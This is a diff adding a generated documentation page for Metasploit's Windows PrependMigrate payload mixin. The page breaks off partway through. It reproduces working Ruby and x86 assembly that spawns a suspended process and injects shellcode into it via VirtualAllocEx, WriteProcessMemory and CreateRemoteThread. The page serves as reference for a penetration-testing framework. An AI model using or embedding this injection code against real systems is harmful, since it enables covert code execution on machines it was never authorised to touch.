@@ -1,0 +1,1471 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>
+  Module: Msf::Payload::Windows::PrependMigrate
+  
+    &mdash; Documentation by YARD 0.9.26
+  
+</title>
+
+  <link rel="stylesheet" href="../../../css/style.css" type="text/css" />
+
+  <link rel="stylesheet" href="../../../css/common.css" type="text/css" />
+
+<script type="text/javascript">
+  pathId = "Msf::Payload::Windows::PrependMigrate";
+  relpath = '../../../';
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div class="nav_wrap">
+      <iframe id="nav" src="../../../class_list.html?1"></iframe>
+      <div id="resizer"></div>
+    </div>
+
+    <div id="main" tabindex="-1">
+      <div id="header">
+        <div id="menu">
+  
+    <a href="../../../_index.html">Index (P)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../Payload.html" title="Msf::Payload (class)">Payload</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Windows</a></span></span>
+     &raquo; 
+    <span class="title">PrependMigrate</span>
+  
+</div>
+
+        <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../../class_list.html">
+
+        <svg width="24" height="24">
+          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
+        </svg>
+    </a>
+  
+</div>
+        <div class="clear"></div>
+      </div>
+
+      <div id="content"><h1>Module: Msf::Payload::Windows::PrependMigrate
+  
+  
+  
+</h1>
+<div class="box_info">
+  
+
+  
+  
+  
+  
+  
+
+  
+  <dl>
+    <dt>Included in:</dt>
+    <dd><span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Msf::Payload::Windows</a></span></dd>
+  </dl>
+  
+
+  
+  <dl>
+    <dt>Defined in:</dt>
+    <dd>lib/msf/core/payload/windows/prepend_migrate.rb</dd>
+  </dl>
+  
+</div>
+
+<h2>Overview</h2><div class="docstring">
+  <div class="discussion">
+    
+<p>This mixin provides support for generating PrependMigrate blocks for Windows payloads</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div>
+
+
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small><a href="#" class="summary_toggle">collapse</a></small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#apply_prepend_migrate-instance_method" title="#apply_prepend_migrate (instance method)">#<strong>apply_prepend_migrate</strong>(buf)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Overload the generate() call to prefix our stubs.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#initialize-instance_method" title="#initialize (instance method)">#<strong>initialize</strong>(info = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Initialize.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#prepend_migrate-instance_method" title="#prepend_migrate (instance method)">#<strong>prepend_migrate</strong>(buf)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Create assembly.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#prepend_migrate%3F-instance_method" title="#prepend_migrate? (instance method)">#<strong>prepend_migrate?</strong>  &#x21d2; Boolean </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns the state of the PrependMigrate option See <a href="https://github.com/rapid7/metasploit-framework/pull/917">github.com/rapid7/metasploit-framework/pull/917</a> for discussion.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#prepend_migrate_64-instance_method" title="#prepend_migrate_64 (instance method)">#<strong>prepend_migrate_64</strong>(buf)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="apply_prepend_migrate-instance_method">
+  
+    #<strong>apply_prepend_migrate</strong>(buf)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Overload the generate() call to prefix our stubs</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/prepend_migrate.rb', line 36</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_apply_prepend_migrate'>apply_prepend_migrate</span><span class='lparen'>(</span><span class='id identifier rubyid_buf'>buf</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_pre'>pre</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+
+  <span class='id identifier rubyid_test_arch'>test_arch</span> <span class='op'>=</span> <span class='lbracket'>[</span> <span class='op'>*</span><span class='lparen'>(</span><span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_arch'>arch</span><span class='rparen'>)</span> <span class='rbracket'>]</span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_prepend_migrate?'>prepend_migrate?</span>
+    <span class='comment'># Handle all x86 code here
+</span>    <span class='kw'>if</span> <span class='id identifier rubyid_test_arch'>test_arch</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span><span class='lparen'>(</span><span class='const'>ARCH_X86</span><span class='rparen'>)</span>
+      <span class='id identifier rubyid_migrate_asm'>migrate_asm</span> <span class='op'>=</span> <span class='id identifier rubyid_prepend_migrate'>prepend_migrate</span><span class='lparen'>(</span><span class='id identifier rubyid_buf'>buf</span><span class='rparen'>)</span>
+      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Shellcode</span><span class='period'>.</span><span class='id identifier rubyid_assemble'>assemble</span><span class='lparen'>(</span><span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Ia32</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='comma'>,</span> <span class='id identifier rubyid_migrate_asm'>migrate_asm</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_encode_string'>encode_string</span>
+    <span class='comment'># Handle all x64 code here
+</span>    <span class='kw'>elsif</span> <span class='id identifier rubyid_test_arch'>test_arch</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span><span class='lparen'>(</span><span class='const'>ARCH_X64</span><span class='rparen'>)</span>
+      <span class='id identifier rubyid_migrate_asm'>migrate_asm</span> <span class='op'>=</span> <span class='id identifier rubyid_prepend_migrate_64'>prepend_migrate_64</span><span class='lparen'>(</span><span class='id identifier rubyid_buf'>buf</span><span class='rparen'>)</span>
+      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Shellcode</span><span class='period'>.</span><span class='id identifier rubyid_assemble'>assemble</span><span class='lparen'>(</span><span class='const'>Metasm</span><span class='op'>::</span><span class='const'>X64</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='comma'>,</span> <span class='id identifier rubyid_migrate_asm'>migrate_asm</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_encode_string'>encode_string</span>
+    <span class='kw'>end</span>
+  <span class='kw'>end</span>
+  <span class='kw'>return</span> <span class='id identifier rubyid_pre'>pre</span> <span class='op'>+</span> <span class='id identifier rubyid_buf'>buf</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="initialize-instance_method">
+  
+    #<strong>initialize</strong>(info = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Initialize</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/prepend_migrate.rb', line 13</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_initialize'>initialize</span><span class='lparen'>(</span><span class='id identifier rubyid_info'>info</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_ret'>ret</span> <span class='op'>=</span> <span class='kw'>super</span><span class='lparen'>(</span> <span class='id identifier rubyid_info'>info</span> <span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_register_advanced_options'>register_advanced_options</span><span class='lparen'>(</span>
+    <span class='lbracket'>[</span>
+      <span class='const'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../OptBool.html" title="Msf::OptBool (class)">OptBool</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../OptBool.html#initialize-instance_method" title="Msf::OptBool#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependMigrate</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span> <span class='kw'>true</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Spawns and runs shellcode in new process</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='kw'>false</span> <span class='rbracket'>]</span><span class='rparen'>)</span><span class='comma'>,</span>
+      <span class='const'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../OptString.html" title="Msf::OptString (class)">OptString</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../OptString.html#initialize-instance_method" title="Msf::OptString#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependMigrateProc</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span> <span class='kw'>false</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Process to spawn and run shellcode in</span><span class='tstring_end'>&quot;</span></span> <span class='rbracket'>]</span><span class='rparen'>)</span>
+    <span class='rbracket'>]</span><span class='comma'>,</span> <span class='const'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../Payload.html" title="Msf::Payload (class)">Payload</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Windows</a></span></span> <span class='rparen'>)</span>
+  <span class='id identifier rubyid_ret'>ret</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="prepend_migrate-instance_method">
+  
+    #<strong>prepend_migrate</strong>(buf)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Create assembly</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208
+209
+210
+211
+212
+213
+214
+215
+216
+217
+218
+219
+220
+221
+222
+223
+224
+225
+226
+227
+228
+229
+230
+231
+232
+233
+234
+235
+236
+237
+238
+239
+240
+241
+242
+243
+244
+245
+246
+247
+248
+249
+250
+251
+252
+253
+254
+255
+256
+257
+258
+259
+260
+261
+262
+263
+264
+265
+266
+267
+268
+269
+270
+271
+272
+273
+274
+275
+276
+277
+278
+279
+280
+281
+282
+283
+284
+285
+286
+287
+288
+289
+290
+291
+292
+293
+294
+295
+296
+297
+298</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/prepend_migrate.rb', line 58</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_prepend_migrate'>prepend_migrate</span><span class='lparen'>(</span><span class='id identifier rubyid_buf'>buf</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_payloadsize'>payloadsize</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>0x%04x</span><span class='tstring_end'>&quot;</span></span> <span class='op'>%</span> <span class='id identifier rubyid_buf'>buf</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span>
+  <span class='id identifier rubyid_procname'>procname</span> <span class='op'>=</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependMigrateProc</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>rundll32</span><span class='tstring_end'>&#39;</span></span>
+
+  <span class='comment'># Prepare instructions to get address of block_api into ebp
+</span>  <span class='id identifier rubyid_block_api_start'>block_api_start</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>    call start
+</span><span class='heredoc_end'>  EOS
+</span>  <span class='id identifier rubyid_block_api_asm'>block_api_asm</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>  api_call:
+    pushad                    ; We preserve all the registers for the caller, bar EAX and ECX.
+    mov ebp, esp              ; Create a new stack frame
+    xor eax, eax              ; Zero EAX (upper 3 bytes will remain zero until function is found)
+    mov edx, [fs:eax+48]      ; Get a pointer to the PEB
+    mov edx, [edx+12]         ; Get PEB-&gt;Ldr
+    mov edx, [edx+20]         ; Get the first module from the InMemoryOrder module list
+  next_mod:                   ;
+    mov esi, [edx+40]         ; Get pointer to modules name (unicode string)
+    movzx ecx, word [edx+38]  ; Set ECX to the length we want to check
+    xor edi, edi              ; Clear EDI which will store the hash of the module name
+  loop_modname:               ;
+    lodsb                     ; Read in the next byte of the name
+    cmp al, &#39;a&#39;               ; Some versions of Windows use lower case module names
+    jl not_lowercase          ;
+    sub al, 0x20              ; If so normalise to uppercase
+  not_lowercase:              ;
+    ror edi, 13               ; Rotate right our hash value
+    add edi, eax              ; Add the next byte of the name
+    loop loop_modname         ; Loop untill we have read enough
+
+    ; We now have the module hash computed
+    push edx                  ; Save the current position in the module list for later
+    push edi                  ; Save the current module hash for later
+    ; Proceed to iterate the export address table
+    mov edx, [edx+16]         ; Get this modules base address
+    mov ecx, [edx+60]         ; Get PE header
+
+    ; use ecx as our EAT pointer here so we can take advantage of jecxz.
+    mov ecx, [ecx+edx+120]    ; Get the EAT from the PE header
+    jecxz get_next_mod1       ; If no EAT present, process the next module
+    add ecx, edx              ; Add the modules base address
+    push ecx                  ; Save the current modules EAT
+    mov ebx, [ecx+32]         ; Get the rva of the function names
+    add ebx, edx              ; Add the modules base address
+    mov ecx, [ecx+24]         ; Get the number of function names
+    ; now ecx returns to its regularly scheduled counter duties
+
+    ; Computing the module hash + function hash
+  get_next_func:              ;
+    jecxz get_next_mod        ; When we reach the start of the EAT (we search backwards), process the next module
+    dec ecx                   ; Decrement the function name counter
+    mov esi, [ebx+ecx*4]      ; Get rva of next module name
+    add esi, edx              ; Add the modules base address
+    xor edi, edi              ; Clear EDI which will store the hash of the function name
+    ; And compare it to the one we want
+  loop_funcname:              ;
+    lodsb                     ; Read in the next byte of the ASCII function name
+    ror edi, 13               ; Rotate right our hash value
+    add edi, eax              ; Add the next byte of the name
+    cmp al, ah                ; Compare AL (the next byte from the name) to AH (null)
+    jne loop_funcname         ; If we have not reached the null terminator, continue
+    add edi, [ebp-8]          ; Add the current module hash to the function hash
+    cmp edi, [ebp+36]         ; Compare the hash to the one we are searchnig for
+    jnz get_next_func         ; Go compute the next function hash if we have not found it
+
+    ; If found, fix up stack, call the function and then value else compute the next one...
+    pop eax                   ; Restore the current modules EAT
+    mov ebx, [eax+36]         ; Get the ordinal table rva
+    add ebx, edx              ; Add the modules base address
+    mov cx, [ebx+2*ecx]       ; Get the desired functions ordinal
+    mov ebx, [eax+28]         ; Get the function addresses table rva
+    add ebx, edx              ; Add the modules base address
+    mov eax, [ebx+4*ecx]      ; Get the desired functions RVA
+    add eax, edx              ; Add the modules base address to get the functions actual VA
+    ; We now fix up the stack and perform the call to the desired function...
+  finish:
+    mov [esp+36], eax         ; Overwrite the old EAX value with the desired api address for the upcoming popad
+    pop ebx                   ; Clear off the current modules hash
+    pop ebx                   ; Clear off the current position in the module list
+    popad                     ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
+    pop ecx                   ; Pop off the origional return address our caller will have pushed
+    pop edx                   ; Pop off the hash value our caller will have pushed
+    push ecx                  ; Push back the correct return value
+    jmp eax                   ; Jump into the required function
+    ; We now automagically return to the correct caller...
+
+  get_next_mod:               ;
+    pop edi                   ; Pop off the current (now the previous) modules EAT
+  get_next_mod1:              ;
+    pop edi                   ; Pop off the current (now the previous) modules hash
+    pop edx                   ; Restore our position in the module list
+    mov edx, [edx]            ; Get the next module
+    jmp.i8 next_mod           ; Process this module
+  ;--------------------------------------------------------------------------------------
+</span><span class='heredoc_end'>  EOS
+</span>
+  <span class='comment'># Prepare default exit block (sleep for a long long time)
+</span>  <span class='id identifier rubyid_exitblock'>exitblock</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>    ;sleep
+    push -1
+    push 0xE035F044           ; hash( &quot;kernel32.dll&quot;, &quot;Sleep&quot; )
+    call ebp                  ; Sleep( ... );
+</span><span class='heredoc_end'>  EOS
+</span>
+  <span class='comment'># Check to see if we can find exitfunc in the payload
+</span>  <span class='id identifier rubyid_exitfunc_index'>exitfunc_index</span> <span class='op'>=</span> <span class='id identifier rubyid_buf'>buf</span><span class='period'>.</span><span class='id identifier rubyid_index'>index</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06\x7C\x0A</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+          <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF\xD5</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_exitfunc_index'>exitfunc_index</span>
+    <span class='id identifier rubyid_exitblock_offset'>exitblock_offset</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>0x%04x + payload - exitblock</span><span class='tstring_end'>&quot;</span></span> <span class='op'>%</span> <span class='lparen'>(</span><span class='id identifier rubyid_exitfunc_index'>exitfunc_index</span> <span class='op'>-</span> <span class='int'>5</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_exitblock'>exitblock</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>exitblock:\njmp $+</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_exitblock_offset'>exitblock_offset</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_block_api_ebp_asm'>block_api_ebp_asm</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>    pop ebp                   ; Pop off the address of &#39;api_call&#39; for calling later.
+</span><span class='heredoc_end'>  EOS
+</span>  <span class='id identifier rubyid_block_close_to_payload'>block_close_to_payload</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+
+  <span class='comment'># Check if we can find block_api in the payload
+</span>  <span class='id identifier rubyid_block_api'>block_api</span> <span class='op'>=</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Shellcode</span><span class='period'>.</span><span class='id identifier rubyid_assemble'>assemble</span><span class='lparen'>(</span><span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Ia32</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='comma'>,</span> <span class='id identifier rubyid_block_api_asm'>block_api_asm</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_encode_string'>encode_string</span>
+  <span class='id identifier rubyid_block_api_index'>block_api_index</span> <span class='op'>=</span> <span class='id identifier rubyid_buf'>buf</span><span class='period'>.</span><span class='id identifier rubyid_index'>index</span><span class='lparen'>(</span><span class='id identifier rubyid_block_api'>block_api</span><span class='rparen'>)</span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_block_api_index'>block_api_index</span>
+
+    <span class='comment'># Prepare instructions to calculate address
+</span>    <span class='id identifier rubyid_ebp_offset'>ebp_offset</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>0x%04x</span><span class='tstring_end'>&quot;</span></span> <span class='op'>%</span> <span class='lparen'>(</span><span class='id identifier rubyid_block_api_index'>block_api_index</span> <span class='op'>+</span> <span class='int'>5</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_block_api_ebp_asm'>block_api_ebp_asm</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>      jmp close_to_payload
+    return_from_close_to_payload:
+      pop ebp
+      add ebp, </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_ebp_offset'>ebp_offset</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+</span><span class='heredoc_end'>    EOS
+</span>    <span class='comment'># Clear now-unneeded instructions
+</span>    <span class='id identifier rubyid_block_api_asm'>block_api_asm</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+    <span class='id identifier rubyid_block_api_start'>block_api_start</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+    <span class='id identifier rubyid_block_close_to_payload'>block_close_to_payload</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>    close_to_payload:
+      call return_from_close_to_payload
+</span><span class='heredoc_end'>    EOS
+</span>  <span class='kw'>end</span>
+
+  <span class='comment'>#put all pieces together
+</span>  <span class='id identifier rubyid_migrate_asm'>migrate_asm</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>    cld                       ; Clear the direction flag.
+    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_block_api_start'>block_api_start</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_block_api_asm'>block_api_asm</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+  start:
+    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_block_api_ebp_asm'>block_api_ebp_asm</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+    ; get our own startupinfo at esp+0x60
+    add esp,-400              ; adjust the stack to avoid corruption
+    lea edx,[esp+0x60]
+    push edx
+    push 0xB16B4AB1           ; hash( &quot;kernel32.dll&quot;, &quot;GetStartupInfoA&quot; )
+    call ebp                  ; GetStartupInfoA( &amp;si );
+
+    lea eax,[esp+0x60]        ; Put startupinfo pointer back in eax
+
+    jmp getcommand
+    gotcommand:
+    pop esi                   ; esi = address of process name (command line)
+
+    ; create the process
+    lea edi,[eax+0x60]        ; Offset of empty space for lpProcessInformation
+    push edi                  ; lpProcessInformation : write processinfo here
+    push eax                  ; lpStartupInfo : current info (read)
+    xor ebx,ebx
+    push ebx                  ; lpCurrentDirectory
+    push ebx                  ; lpEnvironment
+    push 0x08000004           ; dwCreationFlags CREATE_NO_WINDOW | CREATE_SUSPENDED
+    push ebx                  ; bInHeritHandles
+    push ebx                  ; lpThreadAttributes
+    push ebx                  ; lpProcessAttributes
+    push esi                  ; lpCommandLine
+    push ebx                  ; lpApplicationName
+
+    push 0x863FCC79           ; hash( &quot;kernel32.dll&quot;, &quot;CreateProcessA&quot; )
+    call ebp                  ; CreateProcessA( &amp;si );
+
+    ; if we didn&#39;t get a new process, use this one
+    test eax,eax
+    jz payload                ; If process creation failed, jump to shellcode
+
+  goodProcess:
+    ; allocate memory in the process (VirtualAllocEx())
+    ; get handle
+    push 0x40                 ; RWX
+    add bh, 0x10              ; ebx = 0x1000
+    push ebx                  ; MEM_COMMIT
+</span><span class='heredoc_end'>  EOS
+</span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_buf'>buf</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>&gt;</span> <span class='int'>4096</span>
+    <span class='comment'># probably stageless, so we don&#39;t have shellcode size constraints,
+</span>    <span class='comment'># and so we can just set ebx to the size of the payload
+</span>    <span class='id identifier rubyid_migrate_asm'>migrate_asm</span> <span class='op'>&lt;&lt;</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>    mov ebx, </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_payloadsize'>payloadsize</span><span class='embexpr_end'>}</span><span class='tstring_content'> ; stageless size
+</span><span class='heredoc_end'>    EOS
+</span>  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_migrate_asm'>migrate_asm</span> <span class='op'>&lt;&lt;</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>    push ebx                  ; size
+    xor ebx,ebx
+    push ebx                  ; address
+    push [edi]                ; handle
+    push 0x3F9287AE           ; hash( &quot;kernel32.dll&quot;, &quot;VirtualAllocEx&quot; )
+    call ebp                  ; VirtualAllocEx( ...);
+
+    ; eax now contains the destination
+    ; WriteProcessMemory()
+    push esp                  ; lpNumberOfBytesWritten
+    push </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_payloadsize'>payloadsize</span><span class='embexpr_end'>}</span><span class='tstring_content'>       ; nSize
+    ; pick up pointer to shellcode &amp; keep it on stack
+    jmp begin_of_payload
+    begin_of_payload_return:  ; lpBuffer
+    push eax                  ; lpBaseAddress
+    push [edi]                ; hProcess
+    push 0xE7BDD8C5           ; hash( &quot;kernel32.dll&quot;, &quot;WriteProcessMemory&quot; )
+    call ebp                  ; WriteProcessMemory( ...)
+
+    ; run the code (CreateRemoteThread())
+    push ebx                  ; lpthreadID
+    push ebx                  ; run immediately
+    push ebx                  ; no parameter
+    mov ecx,[esp-0x4]
+    push ecx                  ; shellcode
+    push ebx                  ; stacksize
+    push ebx                  ; lpThreadAttributes
+    push [edi]
+    push 0x799AACC6           ; hash( &quot;kernel32.dll&quot;, &quot;CreateRemoteThread&quot; )
+    call ebp                  ; CreateRemoteThread( ...);
+
+    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_exitblock'>exitblock</span><span class='embexpr_end'>}</span><span class='tstring_content'>              ; jmp to exitfunc or long sleep
+
+  getcommand:
+    call gotcommand
+    db &quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_procname'>procname</span><span class='embexpr_end'>}</span><span class='tstring_content'>&quot;
+    db 0x00
+  </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_block_close_to_payload'>block_close_to_payload</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+  begin_of_payload:
+    call begin_of_payload_return
+  payload:
+</span><span class='heredoc_end'>  EOS
+</span>  <span class='id identifier rubyid_migrate_asm'>migrate_asm</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
